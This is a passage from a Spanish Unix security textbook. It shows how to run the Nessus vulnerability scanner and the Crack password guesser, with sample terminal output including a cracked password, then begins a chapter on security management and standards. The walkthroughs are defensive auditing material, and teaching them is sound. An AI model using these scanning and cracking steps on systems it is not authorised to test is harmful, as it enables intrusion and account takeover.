toda la &#xFB01;abilidad del producto &#x2013; nos puede ayudar a detectar accesos no autorizados al sistema y, m&#x00E1;s
importante, modi&#xFB01;caciones que el pirata haya podido realizar en &#x00E9;l para garantizarse un futuro
acceso.
  </para></section><!--end section--><!--l. 1184--><section 
role="section"><title><abbrev role="title-mark">21.6</abbrev><anchor 
   id="x1-32900021.6"  ></anchor>Nessus</title>
<!--l. 1185--><para>  Sin duda una de las herramientas de seguridad m&#x00E1;s utilizadas durante a~nos en todo tipo de entornos Unix
ha sido SATAN (Security Analysis Tool for Auditing Networks), desarrollada por dos pesos pesados dentro
del mundo de la seguridad: Dan Farmer y Wietse Venema. La tarea de SATAN (o SANTA) era
detectar vulnerabilidades de seguridad en sistemas Unix y redes, desde fallos conocidos en el
software hasta pol&#x02CA;&#x0131;ticas incorrectas (<citation>[?]</citation>); el resultado de su ejecuci&#x00F3;n se mostraba en formato
HTML, de forma que cualquier administrador pod&#x02CA;&#x0131;a analizar esa informaci&#x00F3;n de una forma muy
c&#x00F3;moda. Evidentemente, esta herramienta puede convertirse en peligrosa en las manos de un
pirata, por lo que sobre Farmer y Venema llovieron en su d&#x02CA;&#x0131;a las cr&#x02CA;&#x0131;ticas por el dise~no de
SATAN; hoy en d&#x02CA;&#x0131;a, con las ideas de Security through Obscurity y similares ya superadas &#x2013;
esperemos &#x2013;, nadie duda en reconocer la gran utilidad de este tipo de herramientas analizadoras de
vulnerabilidades.
<!--br/-->
<!--br/-->Sin embargo, todo esto suced&#x02CA;&#x0131;a en abril de 1995, y SATAN no se ha actualizado mucho desde entonces (la
&#x00FA;ltima versi&#x00F3;n distribuida es la 1.1.1). Evidentemente, para una herramienta de seguridad este tiempo sin
nuevas versiones es demasiado, por lo que en 1998 surgi&#x00F3; Nessus, un analizador de vulnerabilidades
gratuito, de c&#x00F3;digo fuente libre, y lo m&#x00E1;s importante: igual de f&#x00E1;cil &#x2013; o m&#x00E1;s &#x2013; de utilizar que su
predecesor.
<!--br/-->
<!--br/-->La distribuci&#x00F3;n de Nessus consta de cuatro &#xFB01;cheros b&#x00E1;sicos: las librer&#x02CA;&#x0131;as del programa, las librer&#x02CA;&#x0131;as NASL
(Nessus Attack Scripting Language), el n&#x00FA;cleo de la aplicaci&#x00F3;n y sus plugins; es necesario compilar en este
orden cada una de esas partes. Adem&#x00E1;s, el programa requiere para funcionar correctamente peque~nas
aplicaciones adicionales, como la librer&#x02CA;&#x0131;a GMP, necesaria para las operaciones de cifrado. La compilaci&#x00F3;n
sobre diferentes plataformas Unix no ofrece ning&#x00FA;n problema siempre que se realice en el orden adecuado, y
se suele limitar a un ./configure, make y make install para cada una de las cuatro partes de
Nessus.
<!--br/-->
<!--br/-->Una vez hemos compilado e instalado el programa necesitamos en primer lugar generar &#x2013; como root &#x2013; una
clave de un solo uso para un usuario de Nessus:


     </para><literallayout role="verbatim">
&#x00A0;luisa:~/nessus#&#x00A0;nessusd&#x00A0;-P&#x00A0;toni,prueba
&#x00A0;Generating&#x00A0;primes:&#x00A0;.................q............................;
&#x00A0;Retrying:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;....q...pg
&#x00A0;luisa:~/nessus#
</literallayout>
<!--l. 1226--><para>Podemos veri&#xFB01;car que el nombre de usuario se ha a~nadido correctamente utilizando la opci&#x00F3;n
&#x2018;-L&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~/nessus#&#x00A0;nessusd&#x00A0;-L
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;toni&#x00A0;-&#x00A0;user&#x00A0;password
&#x00A0;luisa:~/nessus#
</literallayout>
<!--l. 1235--><para>Ahora podemos lanzar ya la parte servidora de Nessus, el demonio nessusd; cuando est&#x00E9; este
demonio ejecut&#x00E1;ndose (escucha peticiones en el puerto 3001 por defecto) podemos conectar a
&#x00E9;l mediante el cliente nessus. La primera vez que ejecutemos este programa nos pedir&#x00E1; una
pass phrase con prop&#x00F3;sitos de autenticaci&#x00F3;n, frase que se utilizar&#x00E1; en ejecuciones posteriores del
cliente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;nessus
&#x00A0;Generating&#x00A0;primes:&#x00A0;.......................q..............pg
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;To&#x00A0;protect&#x00A0;your&#x00A0;private&#x00A0;key&#x00A0;just&#x00A0;generated,&#x00A0;enter&#x00A0;your&#x00A0;personal
&#x00A0;&#x00A0;&#x00A0;&#x00A0;pass&#x00A0;phrase,&#x00A0;now.&#x00A0;&#x00A0;Keep&#x00A0;that&#x00A0;pass&#x00A0;phrase&#x00A0;secret.&#x00A0;&#x00A0;And&#x00A0;each&#x00A0;time
&#x00A0;&#x00A0;&#x00A0;&#x00A0;when&#x00A0;you&#x00A0;restart&#x00A0;nessus,&#x00A0;re-enter&#x00A0;that&#x00A0;pass&#x00A0;phrase&#x00A0;when&#x00A0;you&#x00A0;are
&#x00A0;&#x00A0;&#x00A0;&#x00A0;asked,&#x00A0;for.&#x00A0;&#x00A0;This&#x00A0;prevents&#x00A0;anybody&#x00A0;else&#x00A0;from&#x00A0;logging&#x00A0;in&#x00A0;to&#x00A0;the
&#x00A0;&#x00A0;&#x00A0;&#x00A0;nessus&#x00A0;server&#x00A0;using&#x00A0;your&#x00A0;account.
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;The&#x00A0;drawback&#x00A0;of&#x00A0;a&#x00A0;pass&#x00A0;phrase&#x00A0;is&#x00A0;that&#x00A0;it&#x00A0;will&#x00A0;prevent&#x00A0;you&#x00A0;from&#x00A0;being
&#x00A0;&#x00A0;&#x00A0;&#x00A0;able&#x00A0;to&#x00A0;use&#x00A0;nessus(1)&#x00A0;in&#x00A0;a&#x00A0;cron&#x00A0;job&#x00A0;or&#x00A0;in&#x00A0;a&#x00A0;quiet&#x00A0;script.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;If&#x00A0;you&#x00A0;do&#x00A0;not&#x00A0;want&#x00A0;to&#x00A0;use&#x00A0;a&#x00A0;pass&#x00A0;phrase,&#x00A0;enter&#x00A0;a&#x00A0;blank&#x00A0;one.
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;To&#x00A0;change&#x00A0;or&#x00A0;remove&#x00A0;the&#x00A0;pass&#x00A0;phrase,&#x00A0;later&#x00A0;on&#x00A0;read&#x00A0;in&#x00A0;the&#x00A0;manual
&#x00A0;&#x00A0;&#x00A0;&#x00A0;page&#x00A0;nessus(1)&#x00A0;about&#x00A0;the&#x00A0;-C&#x00A0;option.
&#x00A0;
&#x00A0;New&#x00A0;pass&#x00A0;phrase:
&#x00A0;Repeat&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;:
&#x00A0;
&#x00A0;luisa:~$
</literallayout>
<!--l. 1265--><para>Entraremos entonces en un c&#x00F3;modo interfaz gr&#x00E1;&#xFB01;co desde el que mediante el password de usuario creado
anteriormente podemos conectar al servidor de Nessus y comenzar el an&#x00E1;lisis del sistema, especi&#xFB01;cando las
diferentes opciones que el programa nos ofrece a trav&#x00E9;s de dicho interfaz; en la &#xFB01;gura  <ulink 
  url="#x1-3290011"  ><!--ref: nessus--></ulink> se muestra el aspecto
del entorno ofrecido por Nessus.
<!--br/--></para><figure><title/><blockquote>
<section role="center"><title/>
<!--l. 1272--><para> heightwidthdepthnessus.png<graphic width="46.27773pt" fileref="nessus.png" ></graphic>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-3290011"  ></anchor>Figura&#x00A0;21.1</title><para>Interfaz gr&#x00E1;&#xFB01;co de Nessus.</para></blockquote>
</para></section>
  </blockquote></figure>
<!--br/-->A pesar de la comodidad de estos interfaces gr&#x00E1;&#xFB01;cos, muchos usuarios de Unix seguimos pre&#xFB01;riendo la
potencia y &#xFB02;exibilidad de la l&#x02CA;&#x0131;nea de &#x00F3;rdenes; Nessus tambi&#x00E9;n ofrece la posibilidad de escanear un sistema sin
utilizar entorno gr&#x00E1;&#xFB01;co, volcando los resultados en un archivo de texto:

     <literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;cat&#x00A0;entrada
&#x00A0;rosita
&#x00A0;luisa:~$&#x00A0;nessus&#x00A0;-q&#x00A0;localhost&#x00A0;3001&#x00A0;toni&#x00A0;entrada&#x00A0;salida.rosita
&#x00A0;Pass&#x00A0;phrase:
&#x00A0;luisa:~$
</literallayout>
<!--l. 1293--><para>La orden anterior conecta al servidor nessusd situado en el puerto 3001 de la m&#x00E1;quina luisa bajo el nombre
de usuario toni, y desde ah&#x02CA;&#x0131; lanza un ataque a los sistemas indicados en el archivo entrada (en este caso,
s&#x00F3;lamente a rosita); los resultados de dicho ataque se depositan tras el escaneo en el archivo
salida.rosita, un &#xFB01;chero de texto normal y corriente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;head&#x00A0;-13&#x00A0;salida.rosita
&#x00A0;rosita&#x00A0;chargen&#x00A0;(19/tcp)
&#x00A0;rosita&#x00A0;ftp&#x00A0;(21/tcp)
&#x00A0;rosita&#x00A0;telnet&#x00A0;(23/tcp)&#x00A0;INFO&#x00A0;The&#x00A0;Telnet&#x00A0;service&#x00A0;is&#x00A0;running.&#x00A0;This&#x00A0;service&#x00A0;is
&#x00A0;dangerous&#x00A0;in&#x00A0;the&#x00A0;sense&#x00A0;that&#x00A0;it&#x00A0;is&#x00A0;not&#x00A0;ciphered&#x00A0;-&#x00A0;that&#x00A0;is,&#x00A0;everyone&#x00A0;can&#x00A0;sniff
&#x00A0;the&#x00A0;data&#x00A0;that&#x00A0;passes&#x00A0;between&#x00A0;the&#x00A0;telnet&#x00A0;client&#x00A0;and&#x00A0;the&#x00A0;telnet&#x00A0;server.&#x00A0;This
&#x00A0;includes&#x00A0;logins&#x00A0;and&#x00A0;passwords.
&#x00A0;You&#x00A0;should&#x00A0;disable&#x00A0;this&#x00A0;service&#x00A0;and&#x00A0;use&#x00A0;ssh&#x00A0;instead.
&#x00A0;Solution&#x00A0;:&#x00A0;Comment&#x00A0;out&#x00A0;the&#x00A0;&#x2019;telnet&#x2019;&#x00A0;line&#x00A0;in&#x00A0;/etc/inetd.conf.
&#x00A0;Risk&#x00A0;factor&#x00A0;:&#x00A0;Low
&#x00A0;rosita&#x00A0;smtp&#x00A0;(25/tcp)
&#x00A0;rosita&#x00A0;finger&#x00A0;(79/tcp)
&#x00A0;rosita&#x00A0;www&#x00A0;(80/tcp)
&#x00A0;rosita&#x00A0;sunrpc&#x00A0;(111/tcp)
&#x00A0;luisa:~$
</literallayout>
<!--l. 1318--><para>
  </para></section><!--end section--><!--l. 1318--><section 
role="section"><title><abbrev role="title-mark">21.7</abbrev><anchor 
   id="x1-33000021.7"  ></anchor>Crack</title>
<!--l. 1319--><para>  Crack, desarrollado por el experto en seguridad Alec Mu&#xFB00;et, es el &#x2018;adivinador&#x2019; de
contrase~nas m&#x00E1;s utilizado en entornos Unix; actualmente se encuentra en su versi&#x00F3;n
5 <anchor 
   id="x1-330001f5"  ></anchor><footnote><para>     Aunque Crack6 y Crack7 existen, no son realmente nuevas versiones del programa, sino un rompecontrase~nas
minimalista y uno de fuerza bruta, respectivamente.</para></footnote>, que
funciona correctamente en la mayor&#x02CA;&#x0131;a de clones del sistema operativo (Linux, Solaris, OSF&#x2026;). Ejecutar
peri&#x00F3;dicamente Crack sobre el &#xFB01;chero de contrase~nas de sus sistemas es algo muy recomendable para
cualquier administrador m&#x02CA;&#x0131;nimamente preocupado por la seguridad, sin importar que se utilicen
mecanismos para obligar a los usuarios a elegir passwords aceptables.
<!--br/-->
<!--br/-->Este adivinador realiza una primera pasada sobre el &#xFB01;chero de claves intentando romper contrase~nas en
base a la informaci&#x00F3;n de cada usuario almacenada en el archivo; se trata de unas comprobaciones r&#x00E1;pidas
pero efectivas, ya que aunque la cantidad de datos del &#xFB01;chero no es muy grande, se trata de
informaci&#x00F3;n frecuentemente utilizada como password. Tras esta pasada, entran en juego los
diccionarios para seguir adivinando contrase~nas (un diccionario no es m&#x00E1;s que un &#xFB01;chero con
posibles passwords en &#x00E9;l, generalmente uno por l&#x02CA;&#x0131;nea). El propio programa se distribuye con
algunos de estos &#xFB01;cheros, pero es recomendable que se complementen con m&#x00E1;s diccionarios
(existen multitud de ellos disponibles a trav&#x00E9;s de Internet), especialmente con aquellos que
contengan palabras que por las caracter&#x02CA;&#x0131;sticas del sistema sean susceptibles de ser usadas como
claves; por ejemplo, si estamos en Espa~na seguramente nos convendr&#x00E1; utilizar un diccionario con
palabras en castellano; si administramos una m&#x00E1;quina de un departamento de biolog&#x02CA;&#x0131;a, otro
con t&#x00E9;rminos de esta ciencia&#x2026;incluso si sospechamos que nuestros usuarios son a&#xFB01;cionados al
deporte, o a la literatura griega antigua, podemos encontrar diccionarios adecuados a estos
campos.
<!--br/-->
<!--br/-->Con todos estos diccionarios &#x2013; los propios y los que cada administrador puede a~nadir &#x2013; Crack construye
una base de datos con la que empieza a trabajar; la primera pasada utilizando diccionarios consiste
simplemente en probar palabras con todas las letras en min&#x00FA;sculas. Posteriormente, se mezclan may&#x00FA;sculas y
min&#x00FA;sculas, y de esta forma se van combinando caracteres hasta a~nadir n&#x00FA;meros y caracteres alfanum&#x00E9;ricos a
cada palabra de los diccionarios para comprobar que dicha combinaci&#x00F3;n no es utilizada como contrase~na en
el sistema. Habitualmente las primeras pasadas son las que m&#x00E1;s claves son capaces de romper,
pero una vez adivinados los passwords m&#x00E1;s d&#x00E9;biles quiz&#x00E1;s nos interese seguir ejecutando Crack
para obtener contrase~nas m&#x00E1;s elaboradas: recordemos que un atacante puede aprovechar la
potencia de servidores en los que ha penetrado para ejecutar Crack sobre nuestro &#xFB01;chero de

contrase~nas durante mucho tiempo, por lo que es posible que &#x2018;adivine&#x2019; claves que a priori no son
d&#x00E9;biles.
<!--br/-->
<!--br/-->Tal y como se explica en su documentaci&#x00F3;n, la forma en que Crack trata de adivinar contrase~nas es
seguramente la que consigue mayor velocidad; en primer lugar se ordenan y se agrupan las
entradas del &#xFB01;chero de passwords en base a su salt (ya comentamos el mecanismo de cifrado
a la hora de hablar de autenticaci&#x00F3;n de usuarios). Una vez clasi&#xFB01;cadas, para cada grupo de
salts diferente se selecciona una entrada de diccionario convenientemente tratada (may&#x00FA;sculas,
n&#x00FA;meros&#x2026;), se cifra utilizando el salt (esto es lo que consume mayor tiempo de CPU) y se compara
con la contrase~na cifrada de cada miembro del grupo; si coinciden, se ha adivinado un nuevo
password.
<!--br/-->
<!--br/-->Para invocar a Crack utilizamos como argumento el &#xFB01;chero de claves a atacar; por ejemplo, imaginemos
que en lugar de nuestro /etc/passwd vamos a romper las contrase~nas de otra de las m&#x00E1;quinas, guardadas
en el &#xFB01;chero &#x2018;maquina&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/usr/local/c50a#&#x00A0;./Crack&#x00A0;maquina
&#x00A0;Crack&#x00A0;5.0a:&#x00A0;The&#x00A0;Password&#x00A0;Cracker.
&#x00A0;(c)&#x00A0;Alec&#x00A0;Muffett,&#x00A0;1991,&#x00A0;1992,&#x00A0;1993,&#x00A0;1994,&#x00A0;1995,&#x00A0;1996
&#x00A0;System:&#x00A0;Linux&#x00A0;luisa&#x00A0;2.2.13&#x00A0;#6&#x00A0;Tue&#x00A0;Apr&#x00A0;25&#x00A0;03:58:00&#x00A0;CEST&#x00A0;2000&#x00A0;i686&#x00A0;unknown
&#x00A0;Home:&#x00A0;/usr/local/c50a
&#x00A0;Invoked:&#x00A0;./Crack&#x00A0;maquina
&#x00A0;Stamp:&#x00A0;linux-2-unknown
&#x00A0;
&#x00A0;Crack:&#x00A0;making&#x00A0;utilities&#x00A0;in&#x00A0;run/bin/linux-2-unknown
&#x00A0;find&#x00A0;.&#x00A0;-name&#x00A0;&#x0022;*~&#x0022;&#x00A0;-print&#x00A0;|&#x00A0;xargs&#x00A0;-n50&#x00A0;rm&#x00A0;-f
&#x00A0;(&#x00A0;cd&#x00A0;src;&#x00A0;for&#x00A0;dir&#x00A0;in&#x00A0;*&#x00A0;;&#x00A0;do&#x00A0;(&#x00A0;cd&#x00A0;$dir&#x00A0;;&#x00A0;make&#x00A0;clean&#x00A0;)&#x00A0;;&#x00A0;done&#x00A0;)
&#x00A0;make[1]:&#x00A0;Entering&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/lib&#x2019;
&#x00A0;rm&#x00A0;-f&#x00A0;dawglib.o&#x00A0;debug.o&#x00A0;rules.o&#x00A0;stringlib.o&#x00A0;*~
&#x00A0;make[1]:&#x00A0;Leaving&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/lib&#x2019;
&#x00A0;make[1]:&#x00A0;Entering&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/libdes&#x2019;
&#x00A0;/bin/rm&#x00A0;-f&#x00A0;*.o&#x00A0;tags&#x00A0;core&#x00A0;rpw&#x00A0;destest&#x00A0;des&#x00A0;speed&#x00A0;libdes.a&#x00A0;.nfs*&#x00A0;*.old&#x00A0;&#x005C;
&#x00A0;*.bak&#x00A0;destest&#x00A0;rpw&#x00A0;des&#x00A0;speed
&#x00A0;make[1]:&#x00A0;Leaving&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/libdes&#x2019;
&#x00A0;make[1]:&#x00A0;Entering&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/util&#x2019;
&#x00A0;rm&#x00A0;-f&#x00A0;*.o&#x00A0;*~
&#x00A0;make[1]:&#x00A0;Leaving&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/util&#x2019;
&#x00A0;make[1]:&#x00A0;Entering&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/lib&#x2019;
&#x00A0;make[1]:&#x00A0;&#x2018;../../run/bin/linux-2-unknown/libc5.a&#x2019;&#x00A0;is&#x00A0;up&#x00A0;to&#x00A0;date.
&#x00A0;make[1]:&#x00A0;Leaving&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/lib&#x2019;
&#x00A0;make[1]:&#x00A0;Entering&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/util&#x2019;
&#x00A0;all&#x00A0;made&#x00A0;in&#x00A0;util
&#x00A0;make[1]:&#x00A0;Leaving&#x00A0;directory&#x00A0;&#x2018;/usr/local/c50a/src/util&#x2019;
&#x00A0;Crack:&#x00A0;The&#x00A0;dictionaries&#x00A0;seem&#x00A0;up&#x00A0;to&#x00A0;date...
&#x00A0;Crack:&#x00A0;Sorting&#x00A0;out&#x00A0;and&#x00A0;merging&#x00A0;feedback,&#x00A0;please&#x00A0;be&#x00A0;patient...
&#x00A0;Crack:&#x00A0;Merging&#x00A0;password&#x00A0;files...
&#x00A0;Crack:&#x00A0;Creating&#x00A0;gecos-derived&#x00A0;dictionaries
&#x00A0;mkgecosd:&#x00A0;making&#x00A0;non-permuted&#x00A0;words&#x00A0;dictionary
&#x00A0;mkgecosd:&#x00A0;making&#x00A0;permuted&#x00A0;words&#x00A0;dictionary
&#x00A0;Crack:&#x00A0;launching:&#x00A0;cracker&#x00A0;-kill&#x00A0;run/Kluisa.11110
&#x00A0;Done
&#x00A0;luisa:/usr/local/c50a#
</literallayout>
<!--l. 1416--><para>Tras devolver el control al shell el adivinador estar&#x00E1; trabajando en segundo plano:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/usr/local/c50a#&#x00A0;ps
&#x00A0;&#x00A0;&#x00A0;PID&#x00A0;TTY&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;TIME&#x00A0;CMD
&#x00A0;10809&#x00A0;ttyp3&#x00A0;&#x00A0;&#x00A0;&#x00A0;00:00:00&#x00A0;bash
&#x00A0;11327&#x00A0;ttyp3&#x00A0;&#x00A0;&#x00A0;&#x00A0;00:00:07&#x00A0;cracker
&#x00A0;11330&#x00A0;ttyp3&#x00A0;&#x00A0;&#x00A0;&#x00A0;00:00:00&#x00A0;kickdict&#x00A0;&#x003C;defunct&#x003E;
&#x00A0;11333&#x00A0;ttyp3&#x00A0;&#x00A0;&#x00A0;&#x00A0;00:00:00&#x00A0;ps
&#x00A0;luisa:/usr/local/c50a#
</literallayout>
<!--l. 1429--><para>Podemos comprobar el estado del ataque en todo momento utilizando la utilidad Reporter:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/usr/local/c50a#&#x00A0;./Reporter
&#x00A0;----&#x00A0;passwords&#x00A0;cracked&#x00A0;as&#x00A0;of&#x00A0;Thu&#x00A0;May&#x00A0;&#x00A0;4&#x00A0;08:05:35&#x00A0;CEST&#x00A0;2000&#x00A0;----
&#x00A0;
&#x00A0;Guessed&#x00A0;josel&#x00A0;[beatriz]&#x00A0;&#x00A0;Jose&#x00A0;Luis,,0,&#x00A0;[maquina&#x00A0;/bin/ksh]
&#x00A0;
&#x00A0;----&#x00A0;done&#x00A0;----
&#x00A0;luisa:/usr/local/c50a#
</literallayout>
<!--l. 1442--><para>Y para &#xFB01;nalizar la ejecuci&#x00F3;n del adivinador utilizaremos el shellscript plaster:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/usr/local/c50a#&#x00A0;./scripts/plaster
&#x00A0;+&#x00A0;kill&#x00A0;-TERM&#x00A0;11327
&#x00A0;+&#x00A0;rm&#x00A0;-f&#x00A0;run/Kluisa.11110
&#x00A0;+&#x00A0;exit&#x00A0;0
&#x00A0;luisa:/usr/local/c50a#
</literallayout>
<!--l. 1453--><para>Para &#xFB01;nalizar el punto, hay que volver a insistir sobre el uso regular de Crack en cada una de las m&#x00E1;quinas
bajo nuestra responsabilidad; aunque muchos administradores consideran el utilizar este tipo de
programas equipararse a un pirata, hemos de pensar siempre que es mejor que las contrase~nas d&#x00E9;biles las
encuentre el root antes que un atacante. Y si el administrador no utiliza un adivinador de este estilo,
puede dar por seguro que un pirata no dudar&#x00E1; en hacerlo.


</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-33100022"  ></anchor>Gesti&#x00F3;n de la seguridad</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">22.1</abbrev><anchor 
   id="x1-33200022.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  La gesti&#x00F3;n de la seguridad de una organizaci&#x00F3;n puede ser &#x2013; y en muchos casos es &#x2013; algo in&#xFB01;nitamente
complejo, no tanto desde un punto de vista puramente t&#x00E9;cnico sino m&#x00E1;s bien desde un punto de vista
organizativo; no tenemos m&#x00E1;s que pensar en una gran universidad o empresa con un n&#x00FA;mero elevado de
departamentos o &#x00E1;reas: si alguien que pertenece a uno de ellos abandona la organizaci&#x00F3;n, eliminar su acceso
a un cierto sistema no implica ning&#x00FA;n problema t&#x00E9;cnico (el administrador s&#x00F3;lo ha de borrar o bloquear al
usuario, algo inmediato), pero s&#x02CA;&#x0131; graves problemas organizativos: para empezar, &#x00BF;c&#x00F3;mo se entera
un administrador de sistemas que un cierto usuario, que no trabaja directamente junto a &#x00E9;l,
abandona la empresa? &#x00BF;qui&#x00E9;n decide si al usuario se le elimina directamente o se le permite el
acceso a su correo durante un mes? &#x00BF;puede el personal del &#x00E1;rea de seguridad decidir bloquear
el acceso a alguien de cierto &#x2018;rango&#x2019; en la organizaci&#x00F3;n, como un directivo o un director de
departamento, nada m&#x00E1;s que este abandone la misma? &#x00BF;y si resulta que es amigo del director
general o el rector, y luego este se enfada? Como vemos, desde un punto de vista t&#x00E9;cnico no
existe ning&#x00FA;n escollo insalvable, pero s&#x02CA;&#x0131; que existen desde un punto de vista de la gesti&#x00F3;n de la
seguridad&#x2026;
<!--br/-->
<!--br/-->Hoy en d&#x02CA;&#x0131;a, una entidad que trabaje con cualquier tipo de entorno inform&#x00E1;tico, desde peque~nas empresas
con negocios no relacionados directamente con las nuevas tecnolog&#x02CA;&#x0131;as hasta grandes telcos de &#x00E1;mbito
internacional, est&#x00E1; &#x2013; o deber&#x02CA;&#x0131;a estar &#x2013; preocupada por su seguridad. Y no es para menos: el n&#x00FA;mero de
amenazas a los entornos inform&#x00E1;ticos y de comunicaciones crece casi exponencialmente a~no tras a~no,
alcanzando cotas inimaginables hace apenas una d&#x00E9;cada. Y con que el futuro de la interconexi&#x00F3;n de sistemas
sea tan solo la mitad de prometedor de lo que nos tratan de hacer creer, es previsible que la
preocupaci&#x00F3;n por la seguridad vaya en aumento conforme nuestras vidas est&#x00E9;n m&#x00E1;s y m&#x00E1;s &#x2018;conectadas&#x2019; a
Internet.
<!--br/-->
<!--br/-->Hasta hace poco esta preocupaci&#x00F3;n de la que estamos hablando se centraba sobre todo en los aspectos m&#x00E1;s
t&#x00E9;cnicos de la seguridad: alguien convenc&#x02CA;&#x0131;a a alg&#x00FA;n responsable t&#x00E9;cnico que con la implantaci&#x00F3;n de un
cortafuegos corporativo se acabar&#x02CA;&#x0131;an todos los problemas de la organizaci&#x00F3;n, y por supuesto se eleg&#x02CA;&#x0131;a el m&#x00E1;s
caro aunque despu&#x00E9;s nadie supiera implantar en &#x00E9;l una pol&#x02CA;&#x0131;tica correcta; poco despu&#x00E9;s, y en vista
de que el &#xFB01;rewall no era la panacea, otro comercial avispado convenc&#x02CA;&#x0131;a a la direcci&#x00F3;n que lo
que realmente estaba de moda son los sistemas de detecci&#x00F3;n de intrusos, y por supuesto se
&#x2018;dejaba caer&#x2019; un producto de este tipo en la red (se &#x2018;dejaba caer&#x2019;, no se &#x2018;implantaba&#x2019;). En la
actualidad, como las siglas est&#x00E1;n tan de moda, lo que se lleva son las PKIs, que aunque nadie
sepa muy bien como calzarlas en el entorno de operaciones, quedan de maravilla sobre las
slides <anchor 
   id="x1-332001f1"  ></anchor><footnote><para>    Las slides es como muchos llaman a las transparencias de toda la vida, pero en formato PowerPoint&#x2026;Y
es que ya se sabe: cuantos m&#x00E1;s t&#x00E9;rminos anglosajones podamos soltar en una charla, m&#x00E1;s parecer&#x00E1; que sabemos
;-)</para></footnote> de
las presentaciones comerciales de turno.
<!--br/-->
<!--br/-->Por fortuna, las cosas han empezado a cambiar (y digo &#x2018;por fortuna&#x2019; a pesar de ser una persona m&#x00E1;s t&#x00E9;cnica
que organizativa); hoy en d&#x02CA;&#x0131;a la seguridad va m&#x00E1;s all&#x00E1; de lo que pueda ser un cortafuegos, un sistema de
autenticaci&#x00F3;n biom&#x00E9;trico o una red de sensores de detecci&#x00F3;n de intrusos: ya se contemplan aspectos que hasta
hace poco se reservaban a entornos altamente cerrados, como bancos u organizaciones militares. Y es que
nos hemos empezado a dar cuenta de que tan importante o m&#x00E1;s como un buen &#xFB01;rewall es un
plan de continuidad del negocio en caso de cat&#x00E1;strofe &#x2013; especial y desgraciadamente desde el
pasado 11 de septiembre &#x2013;, y que sin una pol&#x02CA;&#x0131;tica de seguridad correctamente implantada en
nuestra organizaci&#x00F3;n no sirven de nada los controles de acceso (f&#x02CA;&#x0131;sicos y l&#x00F3;gicos) a la misma. Se
habla ahora de la gesti&#x00F3;n de la seguridad como algo cr&#x02CA;&#x0131;tico para cualquier organizaci&#x00F3;n, igual
de importante dentro de la misma que los sistemas de calidad o las l&#x02CA;&#x0131;neas de producto que
desarrolla.
<!--br/-->
<!--br/-->Algo que sin duda ha contribuido a todo esto es la aparici&#x00F3;n &#x2013; m&#x00E1;s o menos reciente &#x2013; de normativas y
est&#x00E1;ndares de seguridad, de &#x00E1;mbito tanto nacional como internacional, y sobre todo su aplicaci&#x00F3;n efectiva; no
tenemos m&#x00E1;s que mirar la Ley Org&#x00E1;nica de Protecci&#x00F3;n de Datos de Car&#x00E1;cter Personal en Espa~na: desde que la
Agencia de Protecci&#x00F3;n de Datos impone sanciones millonarias a quienes incumplen sus exigencias, todo el

mundo se preocupa de la correcta gesti&#x00F3;n de su seguridad. Tambi&#x00E9;n han sido importantes la transformaci&#x00F3;n
del British Standard 7799 en una norma ISO (17799) a la que referirse a la hora de hablar de la
de&#xFB01;nici&#x00F3;n de pol&#x02CA;&#x0131;ticas dentro de una organizaci&#x00F3;n, y la de&#xFB01;nici&#x00F3;n del informe UNE 71501 IN como
requisito para proteger y gestionar la seguridad de los sistemas de informaci&#x00F3;n dentro de las
organizaciones.
<!--br/-->
<!--br/-->Hasta tal punto se ha popularizado el mundo de la seguridad que surgen empresas &#x2018;especializadas&#x2019; hasta
de debajo de las piedras, y por supuesto todas cuentan con los mejores expertos, consultores e ingenieros
de seguridad (t&#x02CA;&#x0131;tulos que, al menos que yo sepa, no otorga ninguna universidad espa~nola);
la paranoia se lleva al l&#x02CA;&#x0131;mite cuando se ofrecen certi&#xFB01;caciones comerciales de seguridad del
tipo &#x2018;Certi&#xFB01;cado X en Seguridad&#x2019; o &#x2018;Ingeniero de Seguridad X&#x2019;. Por supuesto, aunque en el
mercado de la seguridad hay excelentes profesionales, la l&#x00F3;gica nos debe llevar a descon&#xFB01;ar
de este tipo de publicidad, pero sin llegar al extremo de descuidar nuestra seguridad por no
con&#xFB01;ar en nadie: como veremos, la seguridad gestionada es en muchas ocasiones una excelente
soluci&#x00F3;n.
<!--br/-->
<!--br/-->En de&#xFB01;nitiva, en este cap&#x02CA;&#x0131;tulo vamos a intentar hablar de aspectos relacionados con la gesti&#x00F3;n de la
